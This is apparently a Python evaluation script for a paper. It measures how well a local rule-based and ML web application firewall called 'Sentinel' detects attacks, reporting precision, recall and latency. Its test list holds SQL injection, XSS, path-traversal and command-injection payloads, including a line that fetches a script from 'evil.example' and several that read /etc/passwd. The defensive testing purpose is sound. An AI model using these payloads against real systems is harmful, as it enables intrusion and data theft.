"""
evaluate.py -- paper ke Section 8 (Evaluation) ke liye numbers.

Chalao:  python evaluate.py

Do configurations compare hoti hain (server chalaye bina, engine seedha call hota hai):
  A = sirf rules (WAF)
  B = rules + ML anomaly
Metrics: precision, recall, false-positive rate, latency.
"flagged" = Sentinel ne request par 'alert' ya 'block' (ya rate_limit) bola.
Sab test SIRF is local engine par chalte hain -- kisi asli website par nahi.
"""
import random
from urllib.parse import quote_plus

from sentinel.engine import Sentinel
from sentinel.normal_traffic import make_normal_request

# (class, payload, already_encoded?, obfuscated?)
ATTACKS = [
    # ---- SQL Injection: seedhe ----
    ("SQLi", "' OR '1'='1", False, False),
    ("SQLi", "' OR 1=1 --", False, False),
    ("SQLi", "admin'--", False, False),
    ("SQLi", "1 UNION SELECT username,password FROM users", False, False),
    ("SQLi", "1' UNION SELECT NULL,NULL--", False, False),
    ("SQLi", "1; DROP TABLE users", False, False),
    ("SQLi", "1 AND SLEEP(5)", False, False),
    ("SQLi", "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 --", False, False),
    ("SQLi", "' OR 'x'='x", False, False),
    ("SQLi", "1 OR 1=1", False, False),
    ("SQLi", "1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>64", False, False),
    # ---- SQL Injection: chhupaaye hue (obfuscated) ----
    ("SQLi", "1 UnIoN SeLeCt 1,2,3", False, True),
    ("SQLi", "1/**/UNION/**/SELECT/**/1,2", False, True),
    ("SQLi", "%2527%2520OR%25201%253D1", True, True),
    ("SQLi", "1 OR 0x31=0x31", False, True),
    ("SQLi", "' or 2>1 --", False, True),
    ("SQLi", "x' OR ''='", False, True),
    ("SQLi", "1 /*!50000UNION*/ /*!50000SELECT*/ 1,2", False, True),
    ("SQLi", "1%0aUNION%0aSELECT%0a1,2", True, True),
    # ---- XSS: seedhe ----
    ("XSS", "<script>alert(1)</script>", False, False),
    ("XSS", "<img src=x onerror=alert(1)>", False, False),
    ("XSS", "<svg onload=alert(1)>", False, False),
    ("XSS", "javascript:alert(document.cookie)", False, False),
    ("XSS", "\"><script>alert('xss')</script>", False, False),
    ("XSS", "<iframe src=\"javascript:alert(1)\">", False, False),
    ("XSS", "<body onload=alert(1)>", False, False),
    # ---- XSS: chhupaaye hue ----
    ("XSS", "<ScRiPt>alert(1)</sCrIpT>", False, True),
    ("XSS", "%3Cscript%3Ealert(1)%3C/script%3E", True, True),
    ("XSS", "<details open ontoggle=alert(1)>", False, True),
    ("XSS", "<a href=\"jav&#x09;ascript:alert(1)\">x</a>", False, True),
    ("XSS", "<img src=x onerror=&#97;lert(1)>", False, True),
    ("XSS", "<input autofocus onfocus=alert(1)>", False, True),
    # ---- Path Traversal ----
    ("Path", "../../etc/passwd", False, False),
    ("Path", "..\\..\\windows\\win.ini", False, False),
    ("Path", "/etc/passwd", False, False),
    ("Path", "..%2f..%2fetc%2fpasswd", True, True),
    ("Path", "....//....//etc/passwd", False, True),
    ("Path", "%252e%252e%252fetc%252fpasswd", True, True),
    # ---- Command Injection ----
    ("Cmd", "; cat /etc/passwd", False, False),
    ("Cmd", "| whoami", False, False),
    ("Cmd", "$(id)", False, False),
    ("Cmd", "`id`", False, False),
    ("Cmd", "127.0.0.1; ls -la", False, False),
    ("Cmd", "&& wget http://evil.example/x.sh", False, False),
    ("Cmd", "127.0.0.1%0Acat%20/etc/hosts", True, True),
    ("Cmd", "$IFS$9cat$IFS/etc/passwd", False, True),
]

# Har payload 3 jagah inject hota hai
POINTS = [
    ("GET", "/search", lambda p: [p]),
    ("GET", "/product", lambda p: [p]),
    ("POST", "/login", lambda p: [p, "x"]),
]

# Asli users jaisi mushkil-lekin-sahi requests (false positive ka honest test)
TRICKY_LEGIT = [
    ("GET", "/search", ["O'Brien jacket"]),
    ("GET", "/search", ["rock & roll t-shirt"]),
    ("GET", "/search", ["C++ programming book"]),
    ("GET", "/search", ["best wireless noise cancelling headphones under 5000 rupees with mic"]),
    ("GET", "/search", ["select your size from the size chart"]),
    ("GET", "/search", ["50% off deals"]),
    ("GET", "/search", ["women's shoes (size 7) - black"]),
    ("GET", "/search", ["AT&T phone plans"]),
    ("GET", "/search", ["1+1=2 math workbook"]),
    ("GET", "/search", ["salt and pepper = classic combo"]),
    ("POST", "/login", ["rahul.sharma@example.com", "P@ssw0rd!#2024"]),
    ("POST", "/login", ["o'neil", "it's-a-secret!"]),
    ("POST", "/login", ["priya", "Tr0ub4dor&3"]),
    ("GET", "/product", ["42"]),
]


def build_cases():
    cases = []
    for klass, payload, pre_encoded, obf in ATTACKS:
        enc = payload if pre_encoded else quote_plus(payload)
        for method, path, make in POINTS:
            vals = make(enc)
            vals = [vals[0]] + [quote_plus(v) for v in vals[1:]]
            cases.append({"label": 1, "klass": klass, "obf": obf, "method": method, "path": path,
                          "values": vals, "desc": payload})
    rng = random.Random(7)                       # training (seed 42) se alag
    for _ in range(400):
        r = make_normal_request(rng)
        cases.append({"label": 0, "klass": "normal", "obf": False, "method": r["method"], "path": r["path"],
                      "values": r["raw_values"], "desc": "(generated normal)"})
    for method, path, vals in TRICKY_LEGIT:
        cases.append({"label": 0, "klass": "tricky", "obf": False, "method": method, "path": path,
                      "values": [quote_plus(v) for v in vals], "desc": " / ".join(vals)})
    return cases


def run(sentinel, cases):
    out = []
    for i, c in enumerate(cases):
        ip = f"10.9.{i // 250}.{i % 250 + 1}"      # har request alag IP se, taaki rate/ban dakhal na de
        d = sentinel.inspect(c["method"], c["path"], c["values"], "Mozilla/5.0", ip)
        out.append((c, d))
    return out


def pct(a, b):
    return 100.0 * a / b if b else 0.0


def summarize(name, results):
    pos = [(c, d) for c, d in results if c["label"] == 1]
    neg = [(c, d) for c, d in results if c["label"] == 0]
    tp = sum(1 for _, d in pos if d["action"] != "allow")
    blocked = sum(1 for _, d in pos if d["action"] == "block")
    fp = sum(1 for _, d in neg if d["action"] != "allow")
    fp_block = sum(1 for _, d in neg if d["action"] == "block")
    precision = pct(tp, tp + fp)
    lat = sorted(d["latency_ms"] for _, d in results)
    mean = sum(lat) / len(lat)
    p95 = lat[int(0.95 * (len(lat) - 1))]
    return {"name": name, "tp": tp, "fn": len(pos) - tp, "fp": fp, "tn": len(neg) - fp,
            "precision": precision, "recall": pct(tp, len(pos)), "blocked_recall": pct(blocked, len(pos)),
            "fpr": pct(fp, len(neg)), "fp_block": fp_block, "mean": mean, "p95": p95}


def recall_by_group(results):
    groups = {}
    for c, d in results:
        if c["label"] != 1:
            continue
        key = (c["klass"], "obfuscated" if c["obf"] else "plain")
        g = groups.setdefault(key, [0, 0])
        g[1] += 1
        g[0] += d["action"] != "allow"
    return groups


def main():
    cases = build_cases()
    n_att = sum(c["label"] for c in cases)
    print(f"Test set: {n_att} attack requests + {len(cases) - n_att} legitimate requests "
          f"({len(TRICKY_LEGIT)} of them hand-made tricky ones)\n")

    res_a = run(Sentinel(use_ml=False, dry_run=True), cases)
    res_b = run(Sentinel(use_ml=True, dry_run=True), cases)
    sa, sb = summarize("A: rules only", res_a), summarize("B: rules + ML", res_b)

    print(f"{'Config':<16}{'Precision':>10}{'Recall':>9}{'Recall(block)':>15}{'FPR':>8}{'FP':>5}{'Lat mean':>10}{'Lat p95':>9}")
    for s in (sa, sb):
        print(f"{s['name']:<16}{s['precision']:>9.1f}%{s['recall']:>8.1f}%{s['blocked_recall']:>14.1f}%"
              f"{s['fpr']:>7.1f}%{s['fp']:>5}{s['mean']:>8.2f}ms{s['p95']:>7.2f}ms")
    print("(Recall = alert ya block; Recall(block) = sirf block. Latency = sirf Sentinel ka engine, network/Flask ko chhodke.)\n")

    print("Recall by attack type (A -> B):")
    ga, gb = recall_by_group(res_a), recall_by_group(res_b)
    for key in sorted(ga):
        print(f"  {key[0]:<6}{key[1]:<11} {pct(*ga[key]):>5.0f}% -> {pct(*gb[key]):>5.0f}%   (n={ga[key][1]})")

    missed = {c["desc"] for c, d in res_b if c["label"] == 1 and d["action"] == "allow"}
    print(f"\nB ne ye attack payloads poore MISS kiye (kisi bhi jagah se allow ho gaye): {len(missed)}")
    for m in sorted(missed):
        print("   -", m)

    print("\nFalse positives (legit request par alert/block):")
    for tag, res in (("A", res_a), ("B", res_b)):
        fps = [(c, d) for c, d in res if c["label"] == 0 and d["action"] != "allow"]
        print(f"  [{tag}] {len(fps)}")
        for c, d in fps[:8]:
            print(f"     {d['action']:<6} {c['desc'][:48]:<48} {d['reason']}")

    print("\nYaad rakho: data NAKLI hai. Paper me CSIC 2010 ya apne lab ka traffic use karke numbers do.")


if __name__ == "__main__":
    main()
